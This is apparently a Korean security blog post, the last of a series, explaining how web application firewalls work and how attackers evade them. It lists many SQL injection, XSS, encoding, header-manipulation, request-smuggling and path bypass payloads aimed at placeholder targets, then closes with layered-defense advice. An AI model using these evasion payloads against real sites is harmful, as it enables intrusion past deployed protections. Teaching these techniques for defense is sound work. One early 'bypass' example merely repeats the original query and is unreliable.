---
title: "공격자의 시선으로 보는 보안: 5편 - WAF 우회 기법"
date: 2026-02-22T20:00:00+09:00
categories:
  - study
  - Security
tags: ["security", "waf", "waf-bypass", "encoding", "owasp", "web-security"]
summary: "WAF(Web Application Firewall)는 SQL Injection, XSS 등의 공격을 차단하는 장치다. 하지만 공격자는 다양한 우회 기법으로 WAF를 피해간다. WAF의 동작 원리와 우회 기법을 이해해야 제대로 된 방어 설계가 가능하다."
showtoc: true
tocopen: true
draft: false
series: ["공격자의 시선으로 보는 보안"]
series_order: 5
---

## 배경

앞의 4편에서 다양한 공격 기법을 살펴봤다.
실제 운영 환경에서는 이러한 공격을 차단하기 위해 WAF를 사용한다.

하지만 WAF는 **완벽한 방어가 아니다.**
WAF는 패턴 매칭에 의존하고, 공격자는 그 패턴을 우회하는 방법을 계속 개발한다.

이 편에서는 WAF가 어떻게 동작하는지, 공격자가 어떻게 우회하는지 이해하는 것이 목적이다.
WAF를 과신하면 안 되는 이유, 그리고 WAF와 함께 코드 레벨 방어를 병행해야 하는 이유다.

---

## 1. WAF란 무엇인가

### 동작 방식

WAF는 HTTP 요청/응답을 검사하여 악성 패턴을 탐지하고 차단한다.

```
클라이언트
    ↓ HTTP 요청
[WAF] ← 요청 검사 (패턴 매칭, 시그니처)
    ↓ 정상 요청만 통과
웹 서버/애플리케이션
```

### 탐지 방식

**1. 시그니처 기반 (가장 일반적)**:
```
차단 패턴 예시:
- SQL 키워드: SELECT, UNION, INSERT, DROP, WHERE
- SQL 특수문자: ', ", --, ;, /*
- XSS 패턴: <script>, javascript:, onerror=, onload=
- 경로 탈출: ../, ..\
```

**2. 이상 탐지 (점수 기반)**:
```
요청의 이상 점수를 계산
SQL 키워드 발견: +5점
특수문자 다수: +3점
헤더 이상: +2점
총점 > 10: 차단
```

**3. 학습 기반 (ML)**:
- 정상 트래픽 패턴을 학습
- 이상한 요청 탐지
- 최근 상용 WAF에서 사용

### WAF의 한계

WAF는 패턴을 보지만 **의미(Semantic)**는 이해하지 못한다.

```
SQL: SELECT * FROM users WHERE id='1' OR '1'='1'
WAF: UNION, SELECT 등 키워드 감지 → 차단

우회: SELECT * FROM users WHERE id='1' OR '1'='1'
      (같은 의미지만 다른 표현으로 패턴 회피)
```

---

## 2. 인코딩 우회

WAF는 원본 문자열을 차단하지만, 인코딩된 문자열은 통과할 수 있다.
서버는 인코딩을 디코딩하여 처리하므로, 동일한 효과가 발생한다.

### 2.1 URL 인코딩

```
원본: <script>alert('XSS')</script>
WAF: <script> 패턴 감지 → 차단

URL 인코딩:
%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
→ WAF가 디코딩 전 검사 시 통과 가능

URL: http://target.com/search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
```

```
SQL Injection 우회:
원본: ' OR 1=1--
URL 인코딩: %27%20OR%201%3D1--
더블 인코딩: %2527%2520OR%25201%253D1--
(서버가 두 번 디코딩할 때 효과적)
```

### 2.2 HTML 엔티티 인코딩

```html
원본: <script>alert('XSS')</script>

HTML 엔티티:
&#60;script&#62;alert(&#39;XSS&#39;)&#60;/script&#62;
→ 브라우저가 해석하여 실행
→ WAF 패턴 회피

다른 방식:
&#x3C;script&#x3E;  (16진수)
\u003cscript\u003e  (JavaScript 유니코드)
```

### 2.3 Base64 인코딩

```
PHP에서 eval() 사용 시:

원본 페이로드:
<?php system('id'); ?>

Base64 인코딩:
PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

취약한 PHP:
eval(base64_decode($_GET['cmd']));

공격 URL:
http://target.com/vuln.php?cmd=PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
→ WAF는 Base64 문자열만 봄 (패턴 없음) → 통과
→ PHP가 디코딩하여 실행
```

---

## 3. SQL 키워드 우회

WAF가 SQL 키워드를 차단할 때 사용하는 우회 기법.

### 3.1 대소문자 변환

```sql
-- WAF 패턴: 소문자 union
-- 우회
UNION, Union, uNiOn, uNION

-- WAF가 대소문자 무시하지 않으면 통과
uNiOn SeLeCt username, password FrOm users--
```

### 3.2 주석 삽입

SQL에서 주석은 무시된다. 키워드 안에 주석을 삽입하면 WAF 패턴을 깬다.

```sql
-- MySQL 인라인 주석
UN/**/ION/**/SEL/**/ECT username FROM users--
→ MySQL 실행: UNION SELECT username FROM users

-- 조건부 주석 (MySQL 전용)
/*!UNION*/ /*!SELECT*/ username FROM users--
→ MySQL: 실행 / 다른 DB: 주석으로 무시

-- 다양한 주석 형식
-- (MySQL: -- , #)
-- (MSSQL: --)
-- (Oracle: --)
-- (공통: /* */)
```

### 3.3 공백 우회

SQL 파서는 다양한 공백 문자를 허용한다.

```sql
-- 일반 공백 대신 다른 문자 사용
UNION%09SELECT  (%09는 탭)
UNION%0ASELECT  (%0A는 개행)
UNION%0DSELECT  (%0D는 캐리지 리턴)
UNION+SELECT    (+ URL에서 공백)

-- 괄호로 공백 대체 (일부 DB)
UNION(SELECT)username,password(FROM)users
```

### 3.4 동의어 및 대안 함수

```sql
-- WAF가 OR를 차단할 때
' OR 1=1--
' || 1=1--     (MySQL: || 은 OR과 같음)
' OORR 1=1--   (이중 OR: WAF가 OR 제거 후 OORR → OR 남음)

-- SLEEP 차단 시 (MySQL)
SLEEP(5) → BENCHMARK(5000000, SHA1(1))

-- SUBSTRING 차단 시
SUBSTRING → MID, SUBSTR, LEFT, RIGHT

-- ASCII 차단 시
ASCII → ORD, CHAR

-- IF 차단 시
IF(1=1,SLEEP(5),0) → CASE WHEN 1=1 THEN SLEEP(5) END
```

---

## 4. XSS WAF 우회

### 4.1 이벤트 핸들러 변형

```html
<!-- WAF가 onerror를 차단할 때 -->
<img src=x onerror=alert('XSS')>    ← 차단

<!-- 다른 이벤트 핸들러 사용 -->
<img src=x onload=alert('XSS')>
<body onpageshow=alert('XSS')>
<input autofocus onfocus=alert('XSS')>
<svg onload=alert('XSS')>
<video src=x onerror=alert('XSS')>
<details open ontoggle=alert('XSS')>
<marquee onstart=alert('XSS')>      ← 구형 태그
```

### 4.2 태그 변형

```html
<!-- WAF가 <script>를 차단할 때 -->
<script>alert('XSS')</script>       ← 차단

<!-- 다른 실행 방법 -->
<img src=x onerror=alert('XSS')>
<svg><script>alert('XSS')</script></svg>
<body><script>alert('XSS')</script>
javascript:alert('XSS')            ← URL context에서

<!-- HTML5 신규 태그 -->
<video><source onerror="alert('XSS')">
<audio src=x onerror=alert('XSS')>
```

### 4.3 JavaScript 난독화

```javascript
// alert 직접 차단 시
alert('XSS')

// 우회 방법들
eval('ale'+'rt("XSS")')
window['ale'+'rt']('XSS')
top['ale'+'rt']('XSS')
\u0061\u006c\u0065\u0072\u0074('XSS')  // 유니코드
String.fromCharCode(97,108,101,114,116)  // charCode
setTimeout('alert("XSS")',0)
Function('alert("XSS")')()

// eval 차단 시
(new Function('alert("XSS")'))()
[].constructor.constructor('alert("XSS")')()
```

### 4.4 Template Literals (ES6)

```javascript
// 따옴표 없이 문자열 처리
alert`XSS`
// alert('XSS')와 동일한 효과

// 따옴표 필터 우회에 활용
<img src=x onerror="alert`XSS`">
```

---

## 5. HTTP 헤더 조작

WAF는 주로 URL과 Body를 검사한다. 헤더를 이용하면 검사를 우회할 수 있다.

### 5.1 Content-Type 변경

```
일반 POST 요청:
Content-Type: application/x-www-form-urlencoded
Body: username=admin&password=test' OR '1'='1

WAF: Body 검사 → SQL 패턴 탐지 → 차단

우회:
Content-Type: application/json
Body: {"username": "admin", "password": "test' OR '1'='1"}

또는:
Content-Type: application/xml
Body: <root><username>admin</username><password>test' OR '1'='1</password></root>

WAF가 JSON/XML 파싱을 다르게 처리하면 우회 가능
```

### 5.2 HTTP 요청 분할 (Request Smuggling)

프론트엔드 WAF/프록시와 백엔드 서버가 Content-Length와 Transfer-Encoding을 다르게 해석할 때 발생.

```
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED_REQUEST_HERE
```

- 프론트엔드: Content-Length=13 기준으로 처리
- 백엔드: Transfer-Encoding 기준으로 처리
- 불일치로 인해 두 번째 요청이 다음 요청에 "주입"됨

### 5.3 X-Forwarded-For 조작

```
WAF가 IP 기반으로 필터링할 때:

X-Forwarded-For: 127.0.0.1
→ WAF가 "내부 IP → 신뢰" 판단
→ 필터링 우회
```

---

## 6. Path와 파라미터 우회

### 6.1 파라미터 오염 (HTTP Parameter Pollution)

같은 파라미터를 여러 번 전송할 때 서버/WAF가 다르게 처리하는 점 이용.

```
URL: /transfer?amount=100&to=admin&amount=1000000

WAF: 첫 번째 amount(100) 검사 → 정상
서버: 마지막 amount(1000000) 사용 → 실제 처리

또는 반대로:
WAF: 마지막 파라미터 검사
서버: 첫 번째 파라미터 사용
```

### 6.2 Path 변형

```
WAF 차단 경로: /admin/panel
우회 시도:
/ADMIN/panel
/admin/./panel
/admin/../admin/panel
/%61%64%6d%69%6e/panel  (URL 인코딩)
//admin/panel
/admin/panel/
```

---

## 7. WAF 탐지 (공격자 관점)

공격자는 우선 WAF 존재 여부와 종류를 파악한다.

```bash
# wafw00f 도구 (WAF 탐지)
wafw00f http://target.com
# 출력:
# Checking http://target.com
# The site http://target.com is behind Cloudflare WAF

# 수동 탐지 (응답 헤더 확인)
curl -I http://target.com
# Server: cloudflare
# X-WAF-Status: blocked
# X-CDN: Incapsula

# 의도적인 악성 페이로드 전송 후 응답 확인
# 403, 406 → WAF 차단
# 응답 내용에 WAF 제품명 포함 경우 있음
```

---

## 8. 방어 전략: WAF를 올바르게 사용하는 법

### WAF는 단독으로 충분하지 않다

```
잘못된 생각:
"WAF를 설치했으니 SQL Injection은 막혔다."

올바른 생각:
"WAF는 알려진 패턴의 공격을 감소시키지만,
 코드 레벨 방어(Prepared Statement)가 없으면
 WAF를 우회하는 공격에 무방비다."
```

### 올바른 다층 방어

```
Layer 1 (코드): Prepared Statement, Output Encoding
Layer 2 (프레임워크): Spring Security, CSRF Token
Layer 3 (설정): HttpOnly/Secure Cookie, CSP 헤더
Layer 4 (인프라): WAF (알려진 공격 차단 보조)
Layer 5 (모니터링): WAF 로그 분석, 이상 트래픽 탐지
```

### WAF 설정 원칙

```
1. Detection Mode로 시작 → 오탐 확인 → Prevention Mode로 전환
   (처음부터 차단하면 정상 트래픽도 막힐 수 있음)

2. 커스텀 룰 추가
   → 우리 애플리케이션 특화된 패턴 차단
   → 공개 WAF 룰셋(ModSecurity CRS)만으로는 부족

3. 로그 분석 자동화
   → WAF 차단 로그 → SIEM 연동 → 이상 패턴 탐지
   → 우회 시도를 탐지해 룰 업데이트

4. 주기적 페네트레이션 테스트
   → WAF가 실제로 차단하는지 검증
   → 우회 가능한 취약점 발견
```

---

## 마무리: 시리즈 전체 정리

5편을 통해 공격자의 시선으로 네트워크와 웹 보안을 살펴봤다.

| 편 | 핵심 내용 | 방어 핵심 |
|---|---|---|
| 1편 | 정찰/스캐닝 | 배너 숨기기, 불필요 포트 차단 |
| 2편 | 네트워크 공격 | SYN Cookie, DNSSEC, DAI |
| 3편 | Injection | Prepared Statement, Output Encoding |
| 4편 | 인증/세션/접근 | CSRF Token, HttpOnly, 경로 검증 |
| 5편 | WAF 우회 | 다층 방어, 코드 레벨 방어 필수 |

**공통 교훈**:

```
1. 프로토콜/설계 단계의 신뢰 가정이 공격의 출발점
   (ARP, HTTP Cookie, 파일 시스템 접근)

2. 보안 도구(WAF, IDS)는 보조 수단이지 해결책이 아님
   코드 레벨 방어가 기본

3. 공격자는 항상 가장 약한 고리를 공격함
   Defense in Depth (다층 방어)가 유일한 답
```

---

*시리즈: 공격자의 시선으로 보는 보안*
- 1편: 정찰과 스캐닝
- 2편: 네트워크 레이어 공격
- 3편: 웹 공격 Part 1 - Injection
- 4편: 웹 공격 Part 2 - 인증/세션/접근 제어
- **5편: WAF 우회 기법** ← 현재 글
